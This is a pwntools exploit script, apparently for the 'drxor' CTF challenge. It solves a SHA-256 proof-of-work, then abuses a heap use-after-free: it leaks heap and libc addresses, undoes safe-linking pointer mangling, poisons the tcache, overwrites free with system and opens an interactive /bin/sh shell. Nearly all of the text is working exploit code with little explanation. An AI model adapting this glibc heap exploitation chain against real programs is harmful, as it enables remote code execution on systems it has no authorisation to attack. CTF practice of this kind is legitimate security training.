from pwn import *
import hashlib

DEBUG=0

if DEBUG:
    p = process('./drxor')
else:
    p = remote('drxorisaurus.ctf.cuctf.io', 9200)
    t = p.readuntil(':')
    val = t.split(' ')[-1][:-1]
    test = 0
    print val
    for x in range(10000000):
        m = hashlib.sha256()
        m.update(str(x))
        g = m.digest().encode('hex')[:6]
        if val == g:
            test = 1
            p.sendline(str(x))
            break
    if test == 0:
        print "sha not found"
        exit(0)
print "starting"

def send(b):
    p.sendlineafter(':',b)#only time timeout is used is in the final swap when system is invoked

def fill(size, data):
    send('1')
    send(str(size))
    p.sendafter(':',data)

#will need to handle leak after
def collect(index):
    send('2')
    send(str(index))

def drain(index):
    send('3')
    send(str(index))

#swap could be used for a malloc also, but we are only interested in the uaf
def swap(index, data):
    send('4')
    send(str(index))
    send('0')
    send(data)

#fill the tcache list a bit and make some values appear in the heap
for x in range(3):
    fill(0x60,'1')
for x in range(2):
    drain(x+1)

for x in range(7):
    fill(0x70,'a'*0x50)

for x in range(7):
    drain(x+1)

print "fill done"

#leak heap
fill(0x70,'1')

collect(1)

heap_leak = p.readuntil('\n\n')[1:-2][::-1].encode('hex')
heap_leak = int(heap_leak,16)

for x in range(3):
    heap_leak = heap_leak ^ ((heap_leak&(0xfff000000000>>(x*12)))>>12)
heap = (heap_leak)&0xfffffffffffff000

print hex(heap)

#overwrite to get tcache * address list in the tcache list
s = (heap+0xb0)^(heap>>12)
swap(1,p64(s))

fill(0x70,'1')

#control tcache
fill(0x70,p64(0) + p64(heap+0xb0) + p64(heap+0x290))

fill(0x70,p64(0x291)+p64(0x451))

#get unsorted value
drain(0)

#leak libc, since the chunk is in the unsorted list should be the first available to 0x60 chunk
fill(0x50,'a')

collect(0)

libc_leak = p.readuntil('\n\n')[1:-2][::-1].encode('hex')
libc_leak = int(libc_leak,16)
libc_leak = libc_leak&0xffffffffffffff00
print "libc_leak " + hex(libc_leak)
free = libc_leak+0x2e40
system = libc_leak-0x16fff0

#get free on the tcache list, and overwrite it
fill(0x60,"/bin/sh\x00"+p64(heap+0xb0)+p64(free))

fill(0x70,p64(system))

#invoke final swap, but system("/bin/sh") is called after the free
send('4')
send('3')

p.interactive()
